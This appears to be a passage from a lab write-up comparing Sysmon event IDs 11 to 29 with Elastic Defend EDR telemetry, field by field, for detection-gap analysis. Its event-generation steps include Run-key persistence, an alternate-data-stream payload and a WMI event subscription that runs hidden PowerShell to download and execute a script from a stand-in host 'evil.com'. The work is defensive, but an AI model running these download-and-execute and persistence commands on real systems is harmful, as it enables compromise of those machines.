| `Target.process.Ext.memory_region.memory_pe.imphash` | `7730ae4afeef9e61ef5f5446791afdff` | `7730ae4afeef9e61ef5f5446791afdff` | `7730ae4afeef9e61ef5f5446791afdff` | Same imphash across all three —same payload |
| `Target.process.Ext.memory_region.hash.sha256` | `-` | present | present | Hash of injected content |
| `Target.process.Ext.memory_region.region_size` | `311296` | `770048` | `770048` | |
| `Target.process.Ext.memory_region.allocation_size` | `786432` | `770048` | `770048` | |
| `Target.process.Ext.memory_region.strings` | extensive list | extensive list | extensive list | Strings extracted from injected memory highest value for threat intel and IOC extraction |
| `Target.process.Ext.memory_region.bytes_address` | present | present | present | Base address of injected region |
| `Target.process.Ext.memory_region.region_state` | `COMMIT` | `COMMIT` | `COMMIT` | |
| `Target.process.Ext.dll.*` | full DLL list | `-` | `-` | Loaded modules in target process |
| `Target.process.thread.Ext.start_address_module` | `Unbacked` | `-` | `-` | |
| `Target.process.thread.Ext.start_address_bytes` | present | `-` | `-` | |
| `Target.process.thread.Ext.start_address_bytes_disasm` | present | `-` | `-` | |
| `Target.process.thread.Ext.call_stack_summary` | `ntdll.dll` | `-` | `-` | |
| `Events[]` | `-` | `VirtualAllocEx` + `WriteProcessMemory` events | `VirtualAllocEx` + `WriteProcessMemory` events | Bundled contributing API events with full context |
| `Events[]._label` | `-` | `api_writeprocmem_suspended_target` | `remote_memory_alloc`, `remote_memory_write` | Semantic label per contributing event |
| `Responses[].action.action` | `kill_process` | `kill_process` (x2) | `kill_process` | Automated response taken |
| `Responses[].process.name` | `svchost.exe` | injector + target | injector only | Which processes were killed |
| `Responses[].result` | `0` (success) | `0` (success) | `0` (success) | |
| `Endpoint.policy.applied.name` | present | present | present | Policy that triggered prevention |

### Analysis
The two most critical gaps in EDR for EID 10 are GrantedAccess and CallTrace where both are absent from endpoint.events.api and instead replaced with other `process.Ext.api.*` fields. However, this is just the raw events without any EDR behaviour module enabled which provides richer and more contextual alert fields, see example above.


## EID 11 FileCreate
EID 11 fires on every file creation or overwrite. Sysmon hooks the minifilter IRP_MJ_CREATE callback at the filesystem layer. Elastic Defend captures file events via its kernel driver generating `endpoint.events.file` events with `event.action: creation`.

### Event Generation
```New-Item "C:\Temp\malicious.exe" -ItemType File -Force```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | No equivalent in EDR |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different format: Sysmon uses `{GUID}`, Elastic uses opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `TargetFilename` | `file.path` | `file.path` | |
| `CreationUtcTime` | `winlog.event_data.CreationUtcTime` | `-` | Not present in EDR |
| `User` | `user.name` | `user.name` | EDR also provides `user.domain` and `user.id` (SID) |
| `-` | `file.extension` | `file.extension` | |
| `-` | `file.name` | `file.name` | |
| `-` | `file.directory` | `-` | Sysmon ECS mapping only |
| `-` | `-` | `file.size` | EDR only `0` bytes (empty file at creation time) |
| `-` | `-` | `file.Ext.entropy` | EDR only `0` entropy at creation useful for detecting pre-filled vs empty drops |
| `-` | `-` | `file.Ext.header_bytes` | EDR only first bytes of file content in hex (empty here but populated on writes) |
| `-` | `-` | `process.parent.pid` | EDR only parent process PID |
| `-` | `-` | `process.thread.id` | EDR only thread that created the file |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of the creating process (`Microsoft Windows`, trusted) |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended code signature with thumbprint |

### Analysis
Core fields are equivalent on both sides. The meaningful EDR advantages are `file.size` and `file.Ext.entropy` at creation time. The field `file.Ext.header_bytes` would be populated if the file had content and reveals the magic bytes immediately.


## EID 12 RegistryEvent (Object create and delete)
EID 12 fires on registry key and value create/delete operations. By default Olaf Hartong Sysmon configuration excludes on create operations. Sysmon hooks the registry callback via CmRegisterCallback at the kernel level. Elastic Defend captures registry events via `endpoint.events.registry` with `event.action: modification` or `event.action: query`. Additional Registry events can we enabled in Advanced Settings with `windows.advanced.events.event_on_access.registry_paths` and `windows.advanced.events.enforce_registry_filters` but are disabled by default.

### Event Generation
```
Had to remove <EventType condition="is">CreateKey</EventType> from Exclude
Then just New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\TestKey" -Force
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` |  |
| `EventType` | `winlog.event_data.EventType` | `-` | Sysmon: `DeleteKey` / `CreateKey`. EDR does not capture key creation or deletion |
| `UtcTime` | `@timestamp` | `-` | |
| `ProcessGuid` | `process.entity_id` | `-` | |
| `ProcessId` | `process.pid` | `-` | |
| `Image` | `process.executable` | `-` | |
| `TargetObject` | `registry.path` | `-` | |
| `-` | `registry.hive` | `-` | |
| `-` | `registry.key` | `-` | |
| `-` | `registry.value` | `-` | |
| `User` | `user.name` + `user.domain` | `-` | |
| `-` | `user.id` | `-` | Sysmon: `S-1-5-18` (SYSTEM context) |

### Analysis
EID 12 (CreateKey / DeleteKey) is a complete EDR gap. Elastic Defend registry collection only captures modification and query actions with and would need special configuration in Advanced settings to produce telemetry for this.


## EID 13 RegistryEvent (Value Set)
EID 13 fires when a registry value is written via NtSetValueKey. EDR detects through `endpoint.events.registry`and action `modification`.

### Event Generation
```Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware" -Value "C:\Temp\malicious.exe"```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | EDR has no rule tagging on raw events |
| `EventType` | `winlog.event_data.EventType` | `-` | Sysmon: `SetValue`. EDR uses `event.action: modification` instead |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats Sysmon `{GUID}`, EDR opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `TargetObject` | `registry.path` | `registry.path` | Sysmon: `HKU\S-1-5-21-...\...\Run\Malware`. EDR: `HKEY_USERS\S-1-5-21-...\...\Run\Malware` different hive prefix format |
| `-` | `registry.hive` | `registry.hive` | Sysmon: `HKU`. EDR: `HKEY_USERS` same hive, different abbreviation |
| `-` | `registry.key` | `registry.key` | Sysmon key includes value name: `...\Run\Malware`. EDR key stops at parent: `...\Run` EDR correctly separates key from value |
| `-` | `registry.value` | `registry.value` | Both same |
| `Details` | `registry.data.strings` | `registry.data.strings` | Both same |
| `-` | `registry.data.type` | `registry.data.type` | Both same |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Both present. Sysmon `user.id`: `S-1-5-18` (SYSTEM context). EDR `user.id`: `S-1-5-21-...` (actual user SID — more accurate) |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of the writing process (`Microsoft Windows`, trusted) |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended signature with thumbprint |
| `-` | `winlog.record_id` | `-` | Sysmon only |
| `-` | `winlog.process.pid` / `winlog.process.thread.id` | `-` | Sysmon only Sysmon service process context |

### Analysis
The core values are same and present in both. Some changes on the key/value format. EDR advantage is `process.code_signature.*` where for example an unsigned binary writing to a Run key with `code_signature.exists: false` is suspicious.


## EID 14 RegistryEvent (Key and Value Rename)
EID 14 fires when a registry key or value is renamed via NtRenameKey. EDR would need changes to the Advanced Settings to capture this telemetry

### Event Generation
```
reg add "HKCU\Software\TestKey" /f
Had to use regedit.exe to manual edit name to trigger the event
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | |
| `EventType` | `winlog.event_data.EventType` | `-` | Sysmon: `RenameKey`. No EDR equivalent |
| `UtcTime` | `@timestamp` | `-` | |
| `ProcessGuid` | `process.entity_id` | `-` | |
| `ProcessId` | `process.pid` | `-` | |
| `Image` | `process.executable` | `-` | Sysmon: `regedit.exe` confirmed only via regedit, not PowerShell `Rename-Item` |
| `TargetObject` | `registry.path` | `-` | |
| `-` | `registry.hive` | `-` | |
| `-` | `registry.key` | `-` | |
| `-` | `registry.value` | `-` | |
| `NewName` | `winlog.event_data.NewName` | `-` | Sysmon: `HKU\S-1-5-21-...\Software\TestKeyssss` the post rename full path |
| `User` | `user.name` + `user.domain` | `-` | |
| `-` | `user.id` | `-` | Sysmon: `S-1-5-18` (SYSTEM context) |
| `-` | `winlog.record_id` | `-` | Sysmon only |

### Analysis
EID 14 is a complete EDR gap no rename events appear in `endpoint.events.registry` for default EDR settings. Also note that NtRenameKey seem to only reliably triggered via regedit.exe and not in PowerShell's Rename-Item.


## EID 15 FileCreateStreamHash 
EID 15 fires when a file is created with a named Alternate Data Stream (ADS). Sysmon hooks the minifilter and captures the stream name and a hash of the stream content to identify the mark-of-the-web.

### Event Generation
```
$payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
Set-Content -Path "C:\Temp\legit.exe:payload.ps1" -Value $payload
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | EDR has no rule tagging on raw events |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats Sysmon `{GUID}`, EDR opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `TargetFilename` | `file.path` | `file.path` | |
| `-` | `file.name` | `file.name` | |
| `-` | `file.extension` | `file.extension` | Sysmon: `ps1` (stream extension). EDR: `exe` (host file extension) different parsing behavior |
| `-` | `file.directory` | `-` | Sysmon only |
| `CreationUtcTime` | `winlog.event_data.CreationUtcTime` | `-` | Sysmon only host file original creation time, not stream creation time |
| `Hash` | `file.hash.sha1` + `file.hash.md5` + `file.hash.sha256` | `-` | Sysmon only multi-algo hash of the stream content |
| `Contents` | `winlog.event_data.Contents` | `-` | Sysmon only raw stream content captured in the event. `IEX (New-Object Net.WebClient).DownloadString(...)` visible directly in the log |
| `-` | `-` | `file.size` | EDR only size of stream content |
| `-` | `-` | `file.Ext.entropy` | EDR only entropy of stream content. Useful for detecting encoded/encrypted payloads in ADS |
| `-` | `-` | `file.Ext.header_bytes` | EDR only first bytes of stream in hex. Decodes to `IEX (New-Object ` confirms payload type without needing `Contents` |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Both present. Sysmon `user.id`: `S-1-5-18`. EDR `user.id`: actual user SID |
| `-` | `-` | `process.parent.pid` | EDR only |
| `-` | `-` | `process.thread.id` | EDR only |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of writing process |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended signature with thumbprint |
| `-` | `winlog.record_id` | `-` | Sysmon only |

### Analysis
Both detect the ADS creation but Sysmon's advantage is `winlog.event_data.Contents`, which captures the raw stream content. Also Sysmon `Zone.Identifier` which was abscent in this lab but is very useful, would need to correlate EDR `endpoint.events.network` to find what url for example powershell.exe attempted connection to.


## EID 16 ServiceConfigurationChange **SKIPPED**


## EID 17/18  Pipe Created / Connected
EID 17 fires when a named pipe is created, EID 18 when a process connects to one and is used for interprocess communications.

### Event Generation
```
pipe = New-Object System.IO.Pipes.NamedPipeServerStream("msagent_01",[System.IO.Pipes.PipeDirection]::InOut)
$client = New-Object System.IO.Pipes.NamedPipeClientStream(".", "msagent_01", [System.IO.Pipes.PipeDirection]::InOut)
$client.Connect(2000)
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field (EID 17 — CreatePipe) | Sysmon Log Field (EID 18 — ConnectPipe) | Elastic Defend Field | Comment |
|---|---|---|---|---|
| `RuleName` | `rule.name`: `-` | `rule.name`: `technique_id=T1021.002,technique_name=SMB/Windows Admin Shares` | `-` | |
| `EventType` | `winlog.event_data.EventType`: `CreatePipe` | `winlog.event_data.EventType`: `ConnectPipe` | `-` | No EDR equivalent for either |
| `UtcTime` | `@timestamp` | `@timestamp` | `-` | |
| `ProcessGuid` | `process.entity_id`| `process.entity_id` | `-` |  |
| `ProcessId` | `process.pid` | `process.pid` | `-` | |
| `Image` | `process.executable`| `process.executable` | `-` | |
| `PipeName` | `file.name` | `file.name` | `-` | Sysmon maps pipe name to `file.name` |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | `-` | |
| `-` | `user.id`: `S-1-5-18` | `user.id`: `S-1-5-18` | `-` | |
| `-` | `event.action`: `PipeEvent (Pipe Created)` | `event.action`: `PipeEvent (Pipe Connected)` | `-` | |
| `-` | `event.type`: `creation` | `event.type`: `access` | `-` | |
| `-` | `winlog.record_id` | `winlog.record_id` | `-` | |

### Analysis
EID 17/18 is an EDR gap where it has no named pipe telemetry dataset. Neither `endpoint.events.file`, `endpoint.events.network`, or `endpoint.events.api` capture pipe create or connect events in standard configuration. There are some EDR Behaviour alerts for named pipe so some kind of monitoring exists but to get a broad coverage Sysmon would be essential.


## EID 19/20/21 WmiEvent (WmiEventFilter activity, WmiEventConsumer activity, WmiEventConsumerToFilter activity)
EID 19 fires on WMI EventFilter creation, EID 20 on EventConsumer creation, EID 21 on FilterToConsumerBinding. Together they capture the full WMI persistence chain.

### Event Generation
```
# Full WMI triggers EID 19, 20, and 21
$FilterName = "TestFilter"
$ConsumerName = "TestConsumer"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# EID 19 EventFilter
$Filter = Set-WmiInstance -Namespace "root\subscription" `
  -Class "__EventFilter" `
  -Arguments @{
    Name = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $Query
  }

# EID 20 EventConsumer (CommandLineEventConsumer)
$Consumer = Set-WmiInstance -Namespace "root\subscription" `
  -Class "CommandLineEventConsumer" `
  -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
  }

# EID 21 FilterToConsumerBinding
$Binding = Set-WmiInstance -Namespace "root\subscription" `
  -Class "__FilterToConsumerBinding" `
  -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
  }

# Clean up after
Get-WMIObject -Namespace "root\subscription" -Class "__EventFilter" |
  Where-Object Name -eq $FilterName | Remove-WmiObject
Get-WMIObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" |
  Where-Object Name -eq $ConsumerName | Remove-WmiObject
Get-WMIObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" |
  Where-Object { $_.Filter -match $FilterName } | Remove-WmiObject
```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field (EID 19 — WmiFilterEvent) | Sysmon Log Field (EID 20 — WmiConsumerEvent) | Sysmon Log Field (EID 21 — WmiBindingEvent) | Elastic Defend Field | Comment |
|---|---|---|---|---|---|
| `RuleName` | `rule.name` | `rule.name` | `rule.name` | `-` | EDR has no WMI subscription telemetry |
| `EventType` | `winlog.event_data.EventType` | `winlog.event_data.EventType` | `winlog.event_data.EventType` | `-` | |
| `Operation` | `winlog.event_data.Operation` | `winlog.event_data.Operation` | `winlog.event_data.Operation` | `-` | Would be `Create`or `Deleted` |
| `UtcTime` | `@timestamp` | `@timestamp` | `@timestamp` | `-` | |
| `Name` | `winlog.event_data.Name` | `winlog.event_data.Name` | `-` | `-` | EID 21 has no `Name` field identity comes from `Consumer` and `Filter` fields instead |
| `EventNamespace` | `winlog.event_data.EventNamespace` | `-` | `-` | `-` | EID 19 only WMI namespace being subscribed to |
| `Query` | `winlog.event_data.Query` | `-` | `-` | `-` | EID 19 only the WQL trigger condition |
| `Type` | `-` | `winlog.event_data.Type` | `-` | `-` | EID 20 only consumer type |
| `Destination` | `-` | `process.executable` | `-` | `-` | EID 20 only the command or script to execute |
| `Consumer` | `-` | `-` | `winlog.event_data.Consumer` | `-` | EID 21 only consumer reference in the binding |
| `Filter` | `-` | `-` | `winlog.event_data.Filter` | `-` | EID 21 only filter reference in the binding. Correlate with EID 19 `Name` to link the triad |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | `user.name` + `user.domain` | `-` | |
| `-` | `winlog.activity_id` | `winlog.activity_id` | `winlog.activity_id` | `-` |  |
| `-` | `-` | `-` | `-` | `process.executable`: `WmiPrvSE.exe` | EDR only indirect signal. WmiPrvSE.exe spawning with `-Embedding` but carries none of the subscription details |
| `-` | `-` | `-` | `-` | `process.parent.executable`: `svchost.exe -k DcomLaunch` | EDR only parent chain confirms DCOM-initiated WmiPrvSE launch |
| `-` | `-` | `-` | `-` | `process.Ext.effective_parent.*` | EDR only effective parent | 

### Analysis
EID 19/20/21 is a complete EDR gap for WMI subscription detection specifically. Elastic Defend produces no events in any dataset that capture the filter name, query, consumer type, destination command, or binding relationship etc. There is however about 15 different EDR Behavior alerts for WMI and WMIC.


## EID 22 DNSEvent (DNS query)
EID 22 fires on every DNS query made by any process. Sysmon hooks the DNS client via ETW.

### Event Generation
```Resolve-DnsName "evil.com"```

### Field Comparision
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `rule.name` | `-` | EDR has no rule tagging |
| `UtcTime` | `@timestamp` | `@timestamp` | Sysmon: `13:53:22`. EDR: `13:53:16` EDR ~6s earlier, hooks DNS client at a lower layer |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats Sysmon `{GUID}`, EDR opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `QueryName` | `dns.question.name` | `dns.question.name` | |
| `-` | `dns.question.registered_domain` | `-` | Sysmon ECS enrichment only: `evil.com` |
| `-` | `dns.question.top_level_domain` | `-` | Sysmon ECS enrichment only: `com` |
| `QueryStatus` | `sysmon.dns.status` | `dns.Ext.status` | Sysmon: `SUCCESS`. EDR: `0` (numeric). Both indicate resolution success |
| `QueryResults` | `dns.resolved_ip` | `dns.resolved_ip` | Sysmon: `66.96.146.129`. EDR: `::ffff:66.96.146.129` (IPv4-mapped IPv6 format) |
| `-` | `dns.answers[].data` | `-` | Sysmon ECS enrichment: `66.96.146.129` |
| `-` | `dns.answers[].type` | `-` | Sysmon ECS enrichment: `A` record type |
| `-` | `network.protocol` | `network.protocol` | Both: `dns` |
| `-` | `-` | `dns.Ext.options` | EDR only DNS query option flags |
| `-` | `-` | `destination.port` | EDR only confirms DNS port |
| `-` | `-` | `network.destination.port` | EDR only |
| `-` | `-` | `event.action`: `lookup_result` | EDR uses `lookup_result`. Sysmon uses `DNSEvent (DNS query)` |
| `-` | `-` | `event.outcome`: `success` | EDR only explicit outcome field |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Both present. Sysmon `user.id`: `S-1-5-18`. EDR `user.id`: actual user SID |
| `-` | `-` | `process.code_signature.*` | EDR only signing status of querying process |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only extended signature with thumbprint |
| `-` | `winlog.record_id` | `-` | Sysmon only |

### Analysis
Both cover DNS query telemetry well with no critical gaps on either side. The dns.resolved_ip format differs where Sysmon returns plain IPv4 (66.96.146.129) while EDR returns IPv4-mapped IPv6 notation (::ffff:66.96.146.129). Also a change in timestamp but would need more testing to confirm if they detect at different layers.


## EID 23 FileDelete
EID 23 fires when a file is deleted. Sysmon optionally archives a copy of the deleted file to C:\Sysmon\ before deletion for further analysis.

### Event Generation
```
New-Item "C:\Temp\malicious.exe" -ItemType File -Force
Remove-Item "C:\Temp\malicious.exe" -Force
```

### Field Comparision
## EID 23 – FileDelete (File Delete Archived)

### Field Comparison

| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `winlog.task` | `-` | EDR has no rule tagging |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats: Sysmon `{GUID}`, EDR opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | |
| `TargetFilename` | `file.path` | `file.path` | |
| `-` | `file.name` | `file.name` | |
| `-` | `file.extension` | `file.extension` | |
| `-` | `file.directory` | `-` | Sysmon ECS enrichment only |
| `Hashes` | `process.hash.sha1` / `.md5` / `.sha256` | `-` | **Critical EDR gap** Sysmon archives a copy of the file and records full hashes before deletion; EDR captures nothing |
| `IsExecutable` | `sysmon.file.is_executable` | `-` | **EDR gap** Sysmon reads PE header to confirm executable status regardless of extension |
| `Archived` | `sysmon.file.archived` | `-` | **EDR gap** EID 23 = archived delete (copy preserved); EID 26 = non-archived delete; EDR uses generic `deletion` for both |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Sysmon `user.id`: `S-1-5-18` (driver/SYSTEM context). EDR `user.id`: actual user SID |
| `-` | `-` | `file.Ext.entropy` | EDR only `0` when file already deleted at capture time |
| `-` | `-` | `file.Ext.header_data` | EDR only empty `[]` when file already deleted |
| `-` | `-` | `file.size`: `-1` | EDR only `-1` indicates file gone when sampled |
| `-` | `-` | `process.code_signature.*` | EDR only |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only |
| `-` | `-` | `process.parent.pid` | EDR only |
| `-` | `winlog.record_id` | `-` | Sysmon only |


### Analysis
The critical gap is hashes where Sysmon archives a copy of the deleted file and records SHA1/MD5/SHA256. EDR adds process code signatures and parent PID fields.


## EID 24 ClipboardChange
Sysmon EID 24 fires when the system clipboard content changes.

### Event Generation
``` EID 24 is by default disabled, add this rule to config <Image condition="is not">dummy</Image> ```

### Field Comparison

| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `winlog.task` | `-` | |
| `UtcTime` | `@timestamp` | `-` | |
| `ProcessGuid` | `process.entity_id` | `-` | |
| `ProcessId` | `process.pid` | `-` | |
| `Image` | `process.executable` | `-` | |
| `Session` | `winlog.event_data.Session` | `-` | Sysmon only Windows session ID |
| `ClientInfo` | `winlog.event_data.ClientInfo` | `-` | Sysmon only user context string |
| `Hashes` | `process.hash.sha1` / `.md5` / `.sha256` | `-` | Sysmon only hashes of the process that modified clipboard |
| `Archived` | `sysmon.file.archived` | `-` | Sysmon only clipboard content dumped to archive when `<CaptureClipboard />` enabled |
| `User` | `user.name` + `user.domain` | `-` | Sysmon `user.id`: `S-1-5-18` (driver context). Actual user in `winlog.event_data.ClientInfo` |
| `-` | `winlog.record_id` | `-` | Sysmon only |

### Analysis
EID 24 is Sysmon only, Elastic Defend has no clipboard monitoring capability. 


### EID 25
Fires when a process image is tampered with using techniques that manipulate how the OS loads or maps a process and can detect attacks such as Process Hollowing.
Sysmon detects these by monitoring for discrepancies between the mapped image in memory and what's on disk. EDR does have some coverage here via memory threat detection (memory_region events and shellcode_thread alerts) and behavioral detection.

### Event Generation
``` Compile and run t4_process_hollowing.cpp ```

### Field Comparison

| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `winlog.task` | `-` | EDR has no rule tagging |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `Target.process.entity_id` | Sysmon reports target process. EDR `process.entity_id` is the attacker; `Target.process.entity_id` is the victim different formats |
| `ProcessId` | `process.pid`: `8104` | `Target.process.pid`: `8104` | Sysmon `process.pid` = target. EDR `process.pid` = attacker, Correlation pivot: Sysmon `process.pid` ↔ EDR `Target.process.pid` |
| `Image` | `process.executable` | `Target.process.executable` | Sysmon reports target (Notepad.exe). EDR `process.executable` is the attacker binary |
| `Type` | `winlog.event_data.Type`: `Image is replaced` | `-` | **Sysmon only** explicit tamper type classification |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Sysmon `user.id`: `S-1-5-18` (driver context). EDR `user.id`: actual user SID |
| `-` | `-` | `process.executable`: `t4_process_hollowing.exe` | EDR only identifies the attacker process; Sysmon has no equivalent |
| `-` | `-` | `process.parent.executable`: `cmd.exe` | EDR only |
| `-` | `-` | `process.code_signature.exists`: `false` | EDR only attacker binary unsigned |
| `-` | `-` | `Target.process.Ext.created_suspended`: `true` | EDR only confirms process started suspended, key hollow indicator |
| `-` | `-` | `Target.process.Ext.token.integrity_level_name` | EDR only |
| `-` | `-` | `process.Ext.api.name`: `SetThreadContext` | EDR only exact API call intercepted via ETW-TI |
| `-` | `-` | `process.Ext.api.summary` | EDR only full call summary with register state |
| `-` | `-` | `process.Ext.api.behaviors` | EDR only `execute_shellcode`, `cross-process`, `parent-child` |
| `-` | `-` | `process.Ext.api.metadata.target_address_name`: `Unbacked` | EDR only RCX points to unbacked memory, strong shellcode indicator |
| `-` | `-` | `process.Ext.api.parameters.*` | EDR only full register snapshot at time of call |

### Analysis
Sysmon capture less details about the event and it only sees the victim process. For EDR it provides the full API-level mechanics and process context.


## EID 26 FileDeleteDetected - SKIPPED
Fires when a file is deleted but without archiving, the file is not preserved, only the deletion is logged. EID 23 and 26 are mutually exclusive so whichever rule matches first wins and will log the event.


## EID 27 FileBlockExecutable
Fires when Sysmon blocks a file from being created when it detects the content is a PE (executable). Requires Sysmon to be configured with a FileBlockExecutable rule which will be an active prevention capability, not just logging. 

### Event Generation
```
Is disabled by default, add this to conf  <TargetFilename condition="contains">\Downloads\test.exe</TargetFilename>
Then copy calc.exe as test.exe and run it
```

### Field Comparison
| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `winlog.task` | `-` | |
| `UtcTime` | `@timestamp` | `-` | |
| `ProcessGuid` | `process.entity_id` | `-` | |
| `ProcessId` | `process.pid` | `-` | |
| `Image` | `process.executable` | `-` | |
| `TargetFilename` | `file.path` | `-` | |
| `-` | `file.name` | `-` | |
| `-` | `file.extension` | `-` | |
| `-` | `file.directory` | `-` | |
| `Hashes` | `process.hash.sha1` / `.md5` / `.sha256` | `-` | Sysmon only hashes of the blocked file |
| `User` | `user.name` + `user.domain` | `-` | |

### Analysis
EID 27 is Sysmon-only as a prevention capability. Sysmon actively blocks the file write at the kernel level based on PE header detection, logs the attempt with full hashes, and marks it `event.outcome: failure`. Elastic Defend has no equivalent file-write blocking mechanism, it can however block execution after the fact via hash/path blocklists, but the file reaches disk first. For dropper prevention on sensitive paths, Sysmon EID 27 is the stronger control.


## EID 28 FileBlockShredding - SKIPPED
Fires when Sysmon blocks a tool from overwriting/shredding a file with the intent to make recovery impossible. Could not manage to trigger the event with either sdelete or cipher.


## EID 29 FileExecutableDetected
Fires when a file with a PE (executable) header is detected being created, unlike EID 27 which blocks it, EID 29 is detection-only and logs it without preventing the write. 

### Event Generation
```Run a .exe from Downloads folder```

### Field Comparison

| Sysmon Rule Field | Sysmon Log Field | Elastic Defend Field | Comment |
|---|---|---|---|
| `RuleName` | `winlog.task` | `-` | EDR has no rule tagging |
| `UtcTime` | `@timestamp` | `@timestamp` | |
| `ProcessGuid` | `process.entity_id` | `process.entity_id` | Different formats: Sysmon `{GUID}`, EDR opaque string |
| `ProcessId` | `process.pid` | `process.pid` | |
| `Image` | `process.executable` | `process.executable` | Both Explorer.EXE case difference only |
| `TargetFilename` | `file.path` | `file.path` | Both same |
| `-` | `file.name` | `file.name` | |
| `-` | `file.extension` | `file.extension` | |
| `-` | `file.directory` | `-` | Sysmon ECS enrichment only |
| `Hashes` | `file.hash.sha1` / `.md5` / `.sha256` | `-` | **EDR gap** no file hashes on creation events |
| `-` | `file.pe.imphash` | `-` | Sysmon only |
| `User` | `user.name` + `user.domain` | `user.name` + `user.domain` | Sysmon `user.id`: `S-1-5-18` (driver context). EDR `user.id`: actual user SID |
| `-` | `-` | `file.Ext.header_bytes`: `4d5a9000...` | EDR only raw MZ header bytes confirming PE |
| `-` | `-` | `file.Ext.entropy`: `6.22` | EDR only useful for packed/encrypted payload detection |
| `-` | `-` | `file.size`: `211992` | EDR only |
| `-` | `-` | `process.code_signature.*` | EDR only |
| `-` | `-` | `process.Ext.code_signature.*` | EDR only |
| `-` | `-` | `process.parent.pid` | EDR only |
| `-` | `winlog.record_id` | `-` | Sysmon only |

### Analysis
This is an extra Sysmon event for just PE creation and in EDR it would just catch it under file creation. Both detect executable drops but bring different value. Sysmon provides hashes (including IMPHASH) which EDR lacks on file creation events. EDR provides `file.Ext.header_bytes` and entropy which Sysmon lacks useful for detecting packed or obfuscated payloads regardless of extension.




# Elastic EDR Advanced Settings
## Windows

### Agent & Connectivity
| Setting | Min Version | Notes |
|---|---|---|
| `windows.advanced.agent.connection_delay` | 7.9+ | |
| `windows.advanced.agent.orphaned_remediation` | 9.2+ | |

### Artifacts
| Setting | Min Version |
|---|---|
| `windows.advanced.artifacts.global.base_url` | 7.9+ |
| `windows.advanced.artifacts.global.manifest_relative_url` | 7.9+ |
| `windows.advanced.artifacts.global.public_key` | 7.9+ |
| `windows.advanced.artifacts.global.interval` | 7.9+ |
| `windows.advanced.artifacts.global.channel` | 8.18+ |
| `windows.advanced.artifacts.global.ca_cert` | 7.9+ |
| `windows.advanced.artifacts.global.proxy_url` | 8.8+ |
| `windows.advanced.artifacts.global.proxy_disable` | 8.8+ |
| `windows.advanced.artifacts.user.public_key` | 7.9+ |
| `windows.advanced.artifacts.user.ca_cert` | 7.9+ |
| `windows.advanced.artifacts.user.proxy_url` | 8.8+ |
| `windows.advanced.artifacts.user.proxy_disable` | 8.8+ |

### Elasticsearch
| Setting | Min Version |
|---|---|
| `windows.advanced.elasticsearch.delay` | 7.9+ |
| `windows.advanced.elasticsearch.tls.verify_peer` | 7.9+ |
